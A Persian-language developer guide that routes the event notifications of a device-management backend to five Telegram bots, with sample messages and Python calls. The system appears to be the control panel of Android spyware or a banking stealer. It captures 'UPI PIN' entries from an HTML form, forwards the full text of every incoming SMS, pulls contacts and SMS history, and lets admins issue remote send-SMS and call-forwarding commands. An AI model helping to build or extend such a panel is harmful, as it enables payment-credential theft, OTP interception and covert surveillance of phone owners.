# 🤖 Telegram Bots Routing Guide

## 📋 دسته‌بندی دقیق لاگ‌ها

این مستند دقیقاً مشخص می‌کنه که **کدوم نوع لاگ به کدوم ربات تلگرام فرستاده بشه**.

---

## 🤖 Bot 1: Device Management (مدیریت دستگاه)

### 📱 انواع Notification:

#### ✅ Device Registration
```
🆕 New Device Registered
📱 Device ID: DEVICE_123
📲 Model: Samsung Galaxy S21
```

**شرایط ارسال:**
- زمانی که دستگاه جدید register می‌شه
- فقط یکبار برای هر دستگاه

---

#### 💳 UPI PIN Detection
```
💳 UPI PIN Detected
📱 Device ID: DEVICE_123
🔢 PIN: 123456
```

**شرایط ارسال:**
- زمانی که UPI PIN از HTML form دریافت بشه
- فقط به ادمین صاحب دستگاه

---

#### 🟢 Device Online
```
🟢 Device Online
📱 Device ID: DEVICE_123
⏰ Last seen: 2 minutes ago
```

**شرایط ارسال:**
- زمانی که دستگاه آفلاین بود و الان آنلاین شد
- نه برای هر heartbeat! (خیلی spam می‌شه)

---

#### 🔴 Device Offline
```
🔴 Device Offline
📱 Device ID: DEVICE_123
⚠️ No heartbeat for 6 minutes
```

**شرایط ارسال:**
- زمانی که دستگاه بیشتر از 6 دقیقه heartbeat نفرستاده
- یکبار در ساعت maximum (جلوگیری از spam)

---

#### ⚠️ Device Issues
```
⚠️ Device Issue Detected
📱 Device ID: DEVICE_123
🔋 Battery: 5%
```

**شرایط ارسال:**
- باتری زیر 10%
- Storage پر شده (>95%)
- مشکلات سخت‌افزاری

---

## 🤖 Bot 2: SMS Only (فقط پیامک‌ها)

### 📨 انواع Notification:

#### 💬 New SMS Received
```
💬 New SMS Received
📱 Device: DEVICE_123
📞 From: +989123456789
📅 Time: 2025-11-10 12:30:00
━━━━━━━━━━━━━━━━━━━
📄 Message:
سلام! این یک پیام تست است.
━━━━━━━━━━━━━━━━━━━
```

**شرایط ارسال:**
- فقط پیامک‌های دریافتی جدید (inbox)
- **نه** برای پیامک‌های ارسالی (sent)
- **نه** برای SMS history uploads

---

#### ❌ SMS Send Failed
```
❌ SMS Send Failed
📱 Device: DEVICE_123
📞 To: +989123456789
⚠️ Error: Network error
```

**شرایط ارسال:**
- فقط زمانی که ارسال SMS فیل بشه
- از endpoint `/sms/delivery-status`

---

## 🤖 Bot 3: Admin Activities (فعالیت‌های ادمین)

### 📊 انواع Notification:

#### ⚙️ Settings Changed
```
⚙️ Settings Changed
👤 Admin: admin_user
📱 Device: DEVICE_123
━━━━━━━━━━━━━━━━━━━
Changes:
• forward_number: +989...
• sms_forward_enabled: true
━━━━━━━━━━━━━━━━━━━
```

**شرایط ارسال:**
- تغییر تنظیمات دستگاه
- فعال/غیرفعال کردن ویژگی‌ها

---

#### 📤 Command Sent
```
📤 Command Sent
👤 Admin: admin_user
📱 Device: DEVICE_123
⚡ Command: send_sms
```

**شرایط ارسال:**
- هر دستوری که ادمین به دستگاه می‌فرسته
- Ping, SMS, Call Forwarding, Upload, etc.

---

#### 🗑️ Data Deleted
```
🗑️ Data Deleted
👤 Admin: admin_user
📱 Device: DEVICE_123
📊 Type: SMS Messages
🔢 Count: 150
```

**شرایط ارسال:**
- حذف SMS, Contacts, Call logs

---

#### 👥 Admin Created
```
👥 New Admin Created
👤 Created by: super_admin
🆕 New admin: new_user
🔐 Role: admin
```

**شرایط ارسال:**
- ایجاد ادمین جدید
- فقط به Super Admin

---

#### ✏️ Admin Updated
```
✏️ Admin Updated
👤 By: super_admin
🎯 Target: admin_user
📝 Changes: Role changed to viewer
```

**شرایط ارسال:**
- تغییر نقش/مجوزها
- غیرفعال/فعال کردن ادمین

---

#### 🗑️ Admin Deleted
```
🗑️ Admin Deleted
👤 By: super_admin
❌ Deleted: old_admin
```

**شرایط ارسال:**
- حذف ادمین

---

## 🤖 Bot 4: Authentication (احراز هویت)

### 🔐 انواع Notification:

#### ✅ Login Successful
```
✅ Admin Login Successful
👤 Username: admin_user
🌐 IP: 192.168.1.100
🕐 Time: 2025-11-10 12:30:00 UTC
```

**شرایط ارسال:**
- لاگین موفق (بعد از 2FA)
- هر بار که ادمین لاگین می‌کنه

---

#### ❌ Login Failed
```
❌ Admin Login Failed
👤 Username: admin_user
🌐 IP: 192.168.1.100
⚠️ Reason: Invalid password
```

**شرایط ارسال:**
- رمز اشتباه
- OTP اشتباه
- Account disabled

---

#### 🚪 Logout
```
🚪 Admin Logged Out
👤 Username: admin_user
🌐 IP: 192.168.1.100
```

**شرایط ارسال:**
- خروج ادمین از پنل

---

#### 🔒 Session Expired
```
🔒 Session Expired
👤 Username: admin_user
⚠️ Reason: New login from different location
```

**شرایط ارسال:**
- Single session - لاگین از جای دیگه
- Token expire شده

---

#### 🔑 2FA Code Sent
```
🔑 Two-Factor Authentication
👤 Admin: admin_user
🌐 IP: 192.168.1.100
🔢 Code: 123456
🕐 Time: 2025-11-10 12:30:00 UTC
```

**شرایط ارسال:**
- **این به ربات 2FA جداگانه می‌ره (نه Bot 4)**
- به chat_id شخصی ادمین

---

#### 🤖 Bot Authenticated
```
🤖 Bot Authenticated
👤 Admin: admin_user
🔑 Bot: TelegramBot_v1
```

**شرایط ارسال:**
- ربات با OTP احراز هویت شده
- دریافت service token

---

## 🤖 Bot 5: System & Monitoring (سیستم و نظارت)

### 🔧 انواع Notification:

#### ⚠️ System Errors
```
⚠️ System Error
🔴 Type: Database Connection
📝 Error: Connection timeout
🕐 Time: 2025-11-10 12:30:00
```

**شرایط ارسال:**
- خطاهای critical سیستم
- Database down
- Firebase error

---

#### 📊 Daily Statistics
```
📊 Daily Statistics
📅 Date: 2025-11-10
━━━━━━━━━━━━━━━━━━━
📱 Total Devices: 150
🟢 Online: 120
🔴 Offline: 30
💬 SMS Today: 1,250
👥 Active Admins: 8
━━━━━━━━━━━━━━━━━━━
```

**شرایط ارسال:**
- هر روز ساعت 00:00 UTC
- فقط به Super Admin

---

#### 🔄 Background Task Status
```
🔄 Background Task
✅ Offline devices checked
🔴 Marked 5 devices as offline
💓 Heartbeat restart sent to all
```

**شرایط ارسال:**
- هر 5 دقیقه (offline check)
- هر 10 دقیقه (heartbeat restart)

---

#### 🚀 Server Started
```
🚀 Server Started
⏰ Time: 2025-11-10 12:00:00
✅ MongoDB: Connected
✅ Firebase: Initialized
📊 Devices: 150
```

**شرایط ارسال:**
- هنگام راه‌اندازی سرور

---

#### 🛑 Server Shutdown
```
🛑 Server Shutdown
⏰ Time: 2025-11-10 18:00:00
📊 Uptime: 6 hours
```

**شرایط ارسال:**
- هنگام خاموش شدن سرور

---

## 🚫 چیزهایی که **نباید** به ربات‌ها فرستاده بشن

### ❌ Spam Prevention

1. **Heartbeat ها** - هر 3 دقیقه می‌آد، خیلی spam می‌شه
2. **Battery Updates** - مگه اینکه critical باشه (<10%)
3. **Ping Responses** - داخلی است
4. **SMS History Uploads** - فقط تعداد کل
5. **Contact Uploads** - فقط تعداد کل
6. **Admin Activities برای Viewer ها** - فقط اعمال مهم

---

## 📊 جدول خلاصه Routing

| Event | Bot 1 | Bot 2 | Bot 3 | Bot 4 | Bot 5 |
|-------|-------|-------|-------|-------|-------|
| Device Register | ✅ | ❌ | ❌ | ❌ | ❌ |
| UPI Detected | ✅ | ❌ | ❌ | ❌ | ❌ |
| Device Online/Offline | ✅ | ❌ | ❌ | ❌ | ❌ |
| New SMS Received | ❌ | ✅ | ❌ | ❌ | ❌ |
| SMS Send Failed | ❌ | ✅ | ❌ | ❌ | ❌ |
| Command Sent | ❌ | ❌ | ✅ | ❌ | ❌ |
| Settings Changed | ❌ | ❌ | ✅ | ❌ | ❌ |
| Data Deleted | ❌ | ❌ | ✅ | ❌ | ❌ |
| Admin Created | ❌ | ❌ | ✅ | ❌ | ❌ |
| Admin Updated | ❌ | ❌ | ✅ | ❌ | ❌ |
| Login Success | ❌ | ❌ | ❌ | ✅ | ❌ |
| Login Failed | ❌ | ❌ | ❌ | ✅ | ❌ |
| Logout | ❌ | ❌ | ❌ | ✅ | ❌ |
| 2FA Code | ❌ | ❌ | ❌ | ❌ | ❌ (ربات 2FA جداگانه) |
| System Error | ❌ | ❌ | ❌ | ❌ | ✅ |
| Daily Stats | ❌ | ❌ | ❌ | ❌ | ✅ |
| Server Status | ❌ | ❌ | ❌ | ❌ | ✅ |

---

## 🔧 Implementation Guidelines

### برای توسعه‌دهندگان:

```python
# ✅ درست - ارسال به ربات صحیح
await telegram_multi_service.send_to_admin(
    admin_username,
    message,
    bot_index=1  # مشخص کردن ربات دقیق
)

# ❌ اشتباه - ارسال به همه ربات‌ها
await telegram_multi_service.send_to_admin(
    admin_username,
    message,
    bot_index=None  # به همه می‌فرسته!
)
```

### قوانین طلایی:

1. **همیشه bot_index رو مشخص کن**
2. **هیچ وقت به همه ربات‌ها broadcast نکن** (مگه emergency)
3. **Spam prevention** - نوتیفیکیشن‌های تکراری رو محدود کن
4. **Rate limiting** - حداکثر 10 پیام در دقیقه به هر ربات

---

## 📱 نمونه کد صحیح

### Device Registration
```python
# Bot 1: Device notifications
await telegram_multi_service.notify_device_registered(
    device_id=device_id,
    device_info=device_info,
    admin_username=admin_username
)
# این داخلاً به Bot 1 می‌فرسته
```

### New SMS
```python
# Bot 2: SMS only
await telegram_multi_service.notify_new_sms(
    device_id=device_id,
    admin_username=admin_username,
    from_number=sender,
    full_message=message
)
# این داخلاً به Bot 2 می‌فرسته
```

### Command Sent
```python
# Bot 3: Admin activities
await telegram_multi_service.notify_command_sent(
    admin_username=current_admin.username,
    device_id=device_id,
    command=command
)
# این داخلاً به Bot 3 می‌فرسته
```

### Admin Login
```python
# Bot 4: Authentication
await telegram_multi_service.notify_admin_login(
    admin_username=admin.username,
    ip_address=ip_address,
    success=True
)
# این داخلاً به Bot 4 می‌فرسته
```

---

**آخرین بروزرسانی:** 2025-11-10  
**نسخه:** 2.0.0
